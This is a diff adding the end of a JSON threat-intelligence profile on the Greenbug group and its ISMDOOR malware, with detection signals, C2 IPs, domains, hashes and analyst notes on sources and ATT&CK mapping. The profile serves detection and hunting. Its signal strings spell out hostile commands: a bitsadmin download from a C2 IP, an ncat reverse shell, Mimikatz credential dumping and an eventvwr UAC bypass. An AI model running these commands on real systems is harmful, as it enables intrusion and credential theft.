+    "bitsadmin /transfer to an external raw-IP URL writing into CSIDL_APPDATA (e.g. http://95.179.177.157:8081/asdfd -> CSIDL_APPDATA\\a8f4.exe); BITS-Client operational log jobs to external hosts",
+    "ISMDOOR DNS covert channel: high-volume DNS queries with 32-char hex session IDs and structured labels (n.n.c.<session>.<c2>, <enc>.<n>.dr.<session>.<c2>, www.<n>.s.<session>.<c2>) and repetitive static AAAA/IPv6 responses (e.g. a67d:db8:...)",
+    "Modified-base64 tokens (chars ! & @ substituting = / +) in DNS labels or command arguments; base64-decoded C2 domains vsiegru.com / kopilkaorukov.com",
+    "HTTP C2/staging on non-standard ports: 95.179.177.157:445, :8081; 185.205.210.46:1003, :1131",
+    "Plink invoked (often renamed comms.exe) with -proxytype http_basic -proxyip and -R/-L port forwarding; Bitvise SSH command-line client with proxy args — RDP/Terminal-Services tunneling",
+    "ncat.exe <IP> 8989 -e cmd.exe reverse shell; Powercat (dp.ps1) execution",
+    "Mimikatz execution (CreateMimi1Bat / ccd61.ps1) and LSASS process access (Sysmon EID 10) from %USERPROFILE%\\documents\\x64",
+    "eventvwr.exe UAC-bypass registry write HKCU\\Software\\Classes\\mscfile\\shell\\open\\command and eventvwr -> powershell lineage (Invoke-EventVwrBypass)",
+    "New Windows service 'VMwareUpdate' (Event ID 7045) with an anomalous image path; payloads named adobe.exe, java.ee, printers.exe, comms.exe",
+    "aspnet_regiis.exe run with decrypt arguments and recursive web.config enumeration to harvest SQL connection strings",
+    "Keylogger Winit.exe and ISMDOOR command activity (ExecuteKL, PWS, SI, ExecutePC, RunNewVersion, CreateMimi1Bat)",
+    "Webshells written to web-content roots; Covenant GRUNTStager.hta; Cobalt Strike / Metasploit beacon staging",
+    "Traffic to/resolution of C2 domains apps.vvvnews.com, vsiegru.com, kopilkaorukov.com, winrepp.com, winsecupdater.com, dnslookupdater.com, dnssecupdater.com and C2/tunnel IPs 95.179.177.157, 185.205.210.46, 185.243.115.69, 185.243.114.247",
+    "Symantec detections Trojan.Ismdoor / Trojan.Ismdoor!gen1 / 'System Infected: Trojan.Ismdoor Activity'"
+  ],
+  "iocs": {
+    "ips": [
+      "95.179.177.157",
+      "185.205.210.46",
+      "185.243.115.69",
+      "185.243.114.247"
+    ],
+    "domains": [
+      "apps.vvvnews.com",
+      "vsiegru.com",
+      "kopilkaorukov.com",
+      "winrepp.com",
+      "winsecupdater.com",
+      "dnslookupdater.com",
+      "dnssecupdater.com"
+    ],
+    "emails": [],
+    "hashes": [
+      "29c76f2115bcb3a92aeeedf3368f6ce94a420cd6d88fd5e4b7c37b51f2768c08",
+      "5bc0a1f33c982916c8085076e8898ddbe8726249867b47df02e58ac3bf466b27",
+      "2a3f36c849d9fbfe510c00ac4aca1750452cd8f6d8b1bc234d22bc0c40ea1613",
+      "9809aeb6fd388db9ba60843d5a8489fea268ba30e3935cb142ed914d49c79ac5",
+      "3c6bc3294a0b4b6e95f747ec847660ce22c5c4eee2681d02cc63f2a88d2d0b86",
+      "fd95ffb7c70f828ef021e7dbdaf852f54f385095e7f58607f093096b68f40a32",
+      "ee32bde60d1175709fde6869daf9c63cd3227155e37f06d45a27a2f45818a3dc",
+      "ece23612029589623e0ae27da942440a9b0a9cd4f9681ec866613e64a247969d",
+      "b8797931ad99b983239980359ef0ae132615ebedbf6fcb0c0e9979404b4a02a8",
+      "9de28b94aa3f1a849221cf74224554b41a77473c694cadf3f2526ab06480eb85",
+      "b51eca570abad9341a08ae4d153d2c64827db876ee0491eb941d7e9a48d43554",
+      "16e1e886576d0c70af0f96e3ccedfd2e72b8b7640f817c08a82b95ff5d4b1218",
+      "abb3ddc945d147a4ed435b71490764bc4a2860f4ad264052f407357911bd6746",
+      "6cb51c7011f27418c772124d4433350a534061f5732c1331f5483d62b42402f7",
+      "9bf8121e0f3461412dde107c4d1ceb2ed18ec0741f458956830e038fd1be6d44",
+      "75cee6136011516dfe7bd9e45b25c2cf5d9af149a81fff0b8b3ab157a8cbf321",
+      "e974237c32f5d28019c5328bd022469236da87eecee19487902133aea89432a0",
+      "f577fc8f22b6eec782dbcbe54f5a8f3b00e8e6d8dc7aa94b2fffcc2b7ce09c6a",
+      "53bbc9ebe40725bd74ebf29616f48a8aed0a544dd0e4f40801ac1b522f2cf32f",
+      "471dadfe16cf2cf82566d404d2b7d1baf66b72c385ae272dcc743a285113e280",
+      "071e20a982ea6b8f9d482685010be7aaf036401ea45e2977aca867cedcdb0217",
+      "450ebd66ba67bb46bf18d122823ff07ef4a7b11afe63b6f269aec9236a1790cd",
+      "4c7813a1f3eb5d5d8b8a1e53af074c96cfc6ddb14b21188fd84970f001bfc0ff",
+      "069a29a0642ea5e2034250f5465cb2230edf1b49ad42d16ff4cddfee1f693314",
+      "faba07425c1fa65a9a68a17b99e83663a2a32fbb2a7c3df347b7a7411a7058bc",
+      "0644b3ffc856eb54b53338ab8ecd22dd005ee5aacfe321f4e61b763a93f82aea",
+      "fc002268620fa67ffe260ea9f3a6bbad8637f9bef8ae85b8d6061cec0390b9e2"
+    ],
+    "cves": []
+  },
+  "yara_rules": [],
+  "confidence": "medium",
+  "notes": "Primary sources are Symantec's Greenbug/Shamoon reporting (2017), Symantec/SECURITY.COM 'Greenbug targets South Asia telecoms' (2020) with a full SHA256 IOC appendix, and NETSCOUT ASERT 'Greenbug's DNS-isms' (2017) documenting the DNS-based ISMDOOR C2. Overall confidence is MEDIUM: the technical procedures and IOCs are corroborated across multiple primary vendor reports (high extraction quality), but Iran-nexus attribution and the Shamoon-precursor link are themselves assessed at MEDIUM confidence — Symantec explicitly states Greenbug MAY have supplied the credentials Shamoon used, based on an ISMDOOR infection found on an administrator machine at a Disttrack victim, not a definitive same-operator finding. Overlap with OilRig/APT34-adjacent Iran-nexus activity is noted honestly and Greenbug is tracked as its own cluster. actor.mitre_id intentionally left empty per tasking; public MITRE ATT&CK Group id G0049 (Greenbug) is cited only as a source. IMPORTANT ENVIRONMENT NOTE: in THIS environment's bundled (reorganized) ATT&CK dataset, group id G0049 resolves to OilRig — not Greenbug — so the bundled group baseline was NOT used for technique selection; every technique was drawn from the Symantec/NETSCOUT primary reports and each technique_id was validated as a key in the environment's bundled techniques map (attack_dump.json, 697 techniques) before inclusion — zero invalid IDs. Tactic-slug normalizations applied per spec: Defense Evasion -> 'stealth' (T1564.004 ADS, T1140 deobfuscate, T1197 BITS Jobs, T1036.005 masquerading, T1027.013 encoded file); UAC bypass T1548.002 -> 'privilege-escalation'; DNS/HTTP/encoding/tunneling/proxy/non-standard-port C2 techniques -> 'command-and-control'. No Impair-Defenses/DLL-side-load/scheduled-task normalizations were needed for this actor. STRONGEST DETECTION SURFACE (detection-candidate, high feasibility): T1566.001 CHM spearphishing, T1218.001 CHM execution, T1564.004 ADS payloads, T1059.001 hidden PowerShell beacons, T1105/T1197 BITS+downloadstring ingress, T1572 Plink/Bitvise SSH tunneling, T1003.001 Mimikatz, T1056.001 keylogger, T1543.003 VMwareUpdate service, T1548.002 eventvwr UAC bypass, T1505.003 webshells. HUNT-leaning (low/medium, off-victim or blended): T1071.004 DNS covert channel, T1573.002 TLS beacons, T1113 screenshots, T1608.001 adversary staging, discovery LOLBins (T1016/T1033/T1049/T1082/T1083/T1087.001). IOCs (SHA256 hashes, C2 domains and C2/tunnel IPs) are taken verbatim from the Symantec South-Asia-telecom appendix and the NETSCOUT ISMDOOR analysis; the two ISMDOOR sample hashes (29c76f... v1.0.3 compiled 2016-11-11 and 5bc0a1... v1.0.19 compiled 2017-04-05) are from NETSCOUT. Legitimate/CDN/publisher domains were excluded. No CVEs are listed because Greenbug's initial access is social (spearphishing/CHM), not exploitation of a specific CVE. ISMDOOR static AAAA response values (e.g. a67d:db8:a2a1:7334:...) are protocol-embedded C2 data rather than routable indicators and are described in detection_signals rather than the iocs.ips array. The Shamoon/W32.Disttrack wiper itself (data-destruction/Impact) is a related but distinct operator cluster and is captured under actor.related_clusters, not as a Greenbug TTP, since Greenbug's own observed role is credential theft, not wiping."
+}
